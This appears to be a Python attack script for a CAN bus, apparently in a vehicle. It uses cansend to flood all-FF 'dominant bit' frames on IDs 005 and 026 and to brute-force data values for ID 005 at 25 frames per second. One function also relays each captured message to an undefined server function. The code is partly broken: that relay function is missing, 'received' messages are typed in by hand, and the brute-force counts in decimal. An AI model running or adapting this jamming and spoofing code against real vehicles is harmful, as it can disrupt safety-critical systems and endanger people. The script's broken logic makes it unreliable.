import os
import subprocess
import time

# Timer variables
previous_time = 0
interval = 0.04  # Interval in seconds (40 milliseconds)

def send_can_message(message_id, data):
    # Format the message
    message = f"{message_id}#{data}"
    # Use subprocess to execute cansend command
    subprocess.run(["cansend", "can0", message])

# Receive CAN messages for 20 seconds before any transmissions are sent
def receive_and_replay_messages():
    global previous_time
    start_time = time.time()
    while time.time() - start_time <= 20:
        # Check if there are any CAN messages available
        message = input("Enter the received CAN message (format: id#data): ")
        message_parts = message.split("#")
        message_id = message_parts[0]
        data = message_parts[1]
        # Relay data to server
        relay_data_to_server(message_id, data)
        # Construct dominant bits message after the "#" sign
        dominant_message = f"{message_id}#FFFFFFFFFFFFFFFF"
        # Send dominant bits message
        send_can_message(message_id, "FFFFFFFFFFFFFFFF")
        print("Sent dominant message:", dominant_message)

# Send CAN messages with dominant bits
def send_messages_with_dominant_bits():
    global previous_time
    # Get current time
    current_time = time.time()
    # Check if it's time to send the CAN message
    if current_time - previous_time >= interval:
        # Save the last time a CAN message was sent
        previous_time = current_time
        # Send CAN message with brute-forced values for 005#
        for i in range(10000000000000000):
            data_string = f"{i:016}"  # Format the value as a string with leading zeros
            message_id = "005"
            message = f"{message_id}#{data_string}"
            send_can_message(message_id, data_string)
            print("Sent message:", message)
            # Send dominant bits message after the "#" sign
            dominant_message = "026#FFFFFFFFFFFFFFFF"  # Dominant bits message
            send_can_message("026", "FFFFFFFFFFFFFFFF")
            print("Sent dominant message:", dominant_message)
            # Maintain 25 frames per second
            time.sleep(0.04)

# Execute the functions
send_messages_with_dominant_bits()
